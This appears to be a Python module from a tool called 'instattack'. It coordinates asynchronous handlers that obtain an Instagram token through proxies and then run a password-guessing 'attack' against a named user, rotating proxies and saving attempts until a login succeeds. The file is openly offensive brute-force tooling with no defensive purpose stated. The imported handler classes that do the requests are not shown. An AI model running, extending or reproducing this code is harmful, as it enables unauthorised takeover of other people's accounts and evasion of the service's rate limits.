import asyncio

from instattack.handlers import (
    ProxyHandler, TokenHandler, PasswordHandler)


def get_handlers(request_config=None, proxy_config=None):

    lock = asyncio.Lock()
    start_event = asyncio.Event()

    proxy_handler = ProxyHandler(
        method='GET',
        lock=lock,
        start_event=start_event,
        **proxy_config
    )
    token_handler = TokenHandler(
        proxy_handler,
        start_event=start_event,
        **request_config
    )
    return proxy_handler, token_handler


def post_handlers(user, request_config=None, proxy_config=None):

    lock = asyncio.Lock()
    start_event = asyncio.Event()
    auth_result_found = asyncio.Event()

    # We actually don't need to provide the lock to the password
    # and token handlers I think, since they don't access _pool directly.
    proxy_handler = ProxyHandler(
        method='POST',
        lock=lock,
        start_event=start_event,
        **proxy_config,
    )
    password_handler = PasswordHandler(
        proxy_handler,
        user=user,
        start_event=start_event,
        stop_event=auth_result_found,
        **request_config,
    )
    return proxy_handler, password_handler


async def get_token(loop, request_config=None, proxy_config=None):
    """
    Uses proxies specifically for GET requests to synchronously make
    requests to the INSTAGRAM_URL until a valid response is received with
    a token that can be used for subsequent stages.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    get_proxy_handler, token_handler = get_handlers(
        request_config=request_config,
        proxy_config=proxy_config,
    )

    try:
        results = await asyncio.gather(
            token_handler.run(loop),
            # TEMPORARY LIMIT - Until things are better maintained with the size
            # of the proxy pools, since it can make putting proxies in the queue
            # slow.
            get_proxy_handler.run(loop, prepopulate=True, prepopulate_limit=25),
        )
    except Exception as e:
        if not get_proxy_handler._stopped:
            await get_proxy_handler.stop(loop)

        # Do we really want to save POST proxies?
        await get_proxy_handler.save(loop)

        loop.call_exception_handler({'exception': e})
        return None
    else:
        await get_proxy_handler.stop(loop)
        return results[0]


async def attack(loop, token, user, request_config=None, proxy_config=None, pwlimit=None):
    """
    Uses the token retrieved from the initial phase of the command to
    iteratively try each password for the given user with the provided
    token until a successful response is achieved for each password or
    a successful authenticated response is achieved for any password.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    post_proxy_handler, password_handler = post_handlers(
        user,
        request_config=request_config,
        proxy_config=proxy_config,
    )
    try:
        results = await asyncio.gather(
            password_handler.run(loop, token, password_limit=pwlimit),
            # TEMPORARY LIMIT - Until things are better maintained with the size
            # of the proxy pools, since it can make putting proxies in the queue
            # slow.
            post_proxy_handler.run(loop, prepopulate=True, prepopulate_limit=200),
        )

    except Exception as e:
        if not post_proxy_handler._stopped:
            await post_proxy_handler.stop(loop)

        # We might need a stop method for the password handler still just in case
        # an exception is raised.
        # await password_handler.stop(loop)

        # Save Attempts Up Until This Point & Save Proxies
        # Do we really want to save POST proxies on exceptions?
        await password_handler.save(loop)
        await post_proxy_handler.save(loop)

        loop.call_exception_handler({'exception': e})

    else:
        # Proxy Handler Should be Stopped?
        await post_proxy_handler.stop(loop)

        # We might need a stop method for the password handler still just in case
        # an exception is raised.
        # await password_handler.stop(loop)

        # Save Attempts Up Until This Point & Save Proxies
        await password_handler.save(loop)
        await post_proxy_handler.save(loop)

        return results[0]
